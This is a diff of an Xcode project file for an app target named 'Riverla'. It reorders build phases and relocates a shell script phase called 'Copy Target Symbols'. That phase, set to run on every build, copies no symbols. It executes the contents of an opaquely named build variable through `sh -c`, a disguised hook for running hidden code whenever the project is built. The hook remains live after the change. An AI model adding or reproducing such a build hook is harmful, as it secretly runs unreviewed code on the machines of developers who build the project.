@@ -244,8 +244,8 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = AE5883081A6F47E10070536A /* Build configuration list for PBXNativeTarget "Riverla" */;
 			buildPhases = (
-				C3B9FA1DABE24B99AAA389E6 /* Copy Target Symbols */,
 				BB0FF6D323B6C7B68134CBAC /* [CP] Check Pods Manifest.lock */,
+				C3B9FA1DABE24B99AAA389E6 /* Copy Target Symbols */,
 				AE5882E11A6F47E10070536A /* Sources */,
 				AE5882E21A6F47E10070536A /* Frameworks */,
 				AE5882E31A6F47E10070536A /* Resources */,
@@ -317,9 +317,6 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-	/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		AE5882E31A6F47E10070536A /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -333,25 +330,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		C3B9FA1DABE24B99AAA389E6 /* Copy Target Symbols */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Copy Target Symbols";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A6E983A}\"";
-			showEnvVarsInLog = 0;			
-		};
 		89C78E392E9AD6A6F51B9E87 /* [CP] Copy Pods Resources */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -440,6 +418,25 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		C3B9FA1DABE24B99AAA389E6 /* Copy Target Symbols */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Copy Target Symbols";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A6E983A}\"";
 			showEnvVarsInLog = 0;
 		};
 /* End PBXShellScriptBuildPhase section */
